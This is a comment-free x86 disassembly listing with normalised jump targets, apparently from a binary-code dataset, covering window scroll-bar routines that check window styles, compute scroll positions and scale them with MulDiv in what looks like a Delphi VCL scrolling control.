dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_44c0e4
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_437f84
call sub_44b948
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_437f84
call sub_44b8dc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44ba5c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_43b290
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44ba94
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44bac8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44ba94
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44ba94
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44bb44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44bac8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434494
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44bac8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4344d8
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44bbdc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44bc3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44be0d ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44bb44
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44bb44
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
push ebp
call sub_44bbdc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
push ebp
call sub_44bbdc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406748
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bfac
jmp r-xdata
sub_44bf34
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44c624
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_44bfac
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_43b290
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_43b290
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_43ae48
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_43ae48
jmp r-xdata
call sub_44b71c
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44c070
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44c624
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_44c128
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
call sub_42447c
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
call sub_42447c
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
call sub_42447c
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c868
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
call sub_42447c
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
call sub_42447c
sub_44c230
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44bb44
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44bb44
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_44c128
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b290
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_44bfac
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44bb44
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_44c348
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_436fbc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b7c4
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b7c4
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_44c3c0
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4030f8
mov eax [ esi + 0x20c ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4370e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_44c40c
push ebx
mov ebx eax
mov eax ebx
call sub_438248
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_44c624
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bb5c
test al al
jne r-xdata
mov eax ebx
call sub_43b290
push eax
call sub_4244b0
sub_44c44c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c5a4
mov ecx edi
mov edx esi
mov eax ebx
call sub_437990
pop edi
pop esi
pop ebx
retn
sub_44c48c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c594
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_434494
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_44ba5c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_44bfac
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437f84
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437f84
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413898
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_434200
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c59b
mov eax [ ebp - 0x10 ]
call sub_4030f8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44b8a4
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4139f4
xor ecx ecx
mov edx 0xb03e
call sub_435c5c
inc ebx
dec esi
jne r-xdata
sub_44c5c8
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44c0fc
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44c0fc
mov eax ebx
call sub_44c5a4
jmp r-xdata
sub_44c624
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43b594
test al al
je r-xdata
xor eax eax
push ebp
push sub_44c70f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_44bbc4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44bbc4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_44c230
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_44c230
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_44c230
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44c230
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_44c230
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44c230
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44c734
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_4345a8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4345d4
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_4345a8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4345d4
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_434494
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44bfac
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_434494
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4344d8
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44bfac
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_434494
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_44bfac
mov eax ebx
call sub_434494
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4344d8
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4344d8
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_44bfac
mov eax ebx
call sub_4344d8
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_44c888
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44bfac
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44bfac
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44c0fc
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44c0fc
sub_44c92c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44c888
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ad9c
pop edi
pop esi
pop ebx
retn
sub_44c954
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_44c9be
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43987c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c9c5
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_44c9c5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_44c9fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44c5a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ca04
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44ca04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c624
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_44ca78
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4344d8
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4225b0
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_434494
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4225b0
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4125e8
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4372fc
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44cae8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44cb49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403284
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a60c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cb50
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_44cb78
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
